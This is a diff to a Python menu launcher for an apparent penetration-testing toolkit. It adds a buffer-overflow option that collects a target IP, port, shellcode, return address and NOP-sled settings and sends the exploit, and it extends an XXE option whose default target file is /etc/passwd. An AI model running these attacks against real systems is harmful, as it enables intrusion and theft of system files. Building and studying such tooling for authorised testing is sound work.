@@ -90,6 +90,51 @@ def ssrf():
     subprocess.run(shlex.split(cmd))
     os.chdir("..")
 
+def buffer_overflow():
+    os.chdir("Buffer-Overflow")
+    os.system("clear")
+    pyfiglet.print_figlet("Buffer Overflow")  # Fixed typo
+
+    print("[+] Enter the IP address: ")
+    ip = input(">>> ").strip()
+
+    print("[+] Enter the port number: ")
+    port_number = input(">>> ").strip()
+
+    print("[+] Enter the path to the shellcode (default shellcode.bin): ")
+    shellcode_path = input(">>> ").strip() or "shellcode.bin"
+
+    print("[+] Enter the buffer size: ")
+    buffer_size = input(">>> ").strip()
+
+    print("[+] Enter the return address (hex, e.g. 0x7fffffffdbe0): ")
+    return_address = input(">>> ").strip()
+
+    print("[+] Enter the NOP sled size (default 128): ")
+    nop_size = input(">>> ").strip() or "128"
+
+    print("[+] Enter extra offset adjustment (default 0): ")
+    extra_offset = input(">>> ").strip() or "0"
+
+    print("[+] Enter bad chars to avoid (comma-separated hex, default 00,0a,0d): ")
+    bad_chars = input(">>> ").strip() or "00,0a,0d"
+
+    cmd = (
+        f"python3 buffer_overflow.py "
+        f"-H {ip} "
+        f"-p {port_number} "
+        f"-s {shellcode_path} "
+        f"-b {buffer_size} "
+        f"-r {return_address} "
+        f"--nop-size {nop_size} "
+        f"--extra-offset {extra_offset} "
+        f"--bad-chars {bad_chars} "
+        f"--send"
+    )
+
+    subprocess.run(shlex.split(cmd))
+    os.chdir("..")
+
 def xxe():
     os.chdir("XXE")
     print("[+] Enter the URL of the vulnerable web application: ")
@@ -98,6 +143,8 @@ def xxe():
     file_path = input(">>> ").strip() or "/etc/passwd"
     print("[+] Enter the XML field name [default: email]: ")
     field = input(">>> ").strip() or "email"
+    print("[+] Enter the HTTP method (GET or POST) [default: POST]: ")
+    method = input(">>> ").strip().upper() or "POST"
     print("[+] Use PHP filter? (y/n): ")
     php_filter = "--php-filter" if input(">>> ").strip().lower() == "y" else ""
 
@@ -237,7 +284,8 @@ def main():
         print("6. XSS")
         print("7. API Pentesting Toolkit")
         print("8. Fuzzer")
-        print("9. Exit")
+        print("9. Buffer Overflow")   # ADD THIS
+        print("10. Exit")             # BUMP THIS
         print(">>> ", end="")
         choice = input().strip()
         if choice == "1":
@@ -257,6 +305,8 @@ def main():
         elif choice == "8":
             fuzz()
         elif choice == "9":
+            buffer_overflow()         # ADD THIS
+        elif choice == "10":          # BUMP THIS
             print("Goodbye!")
             break
         else:
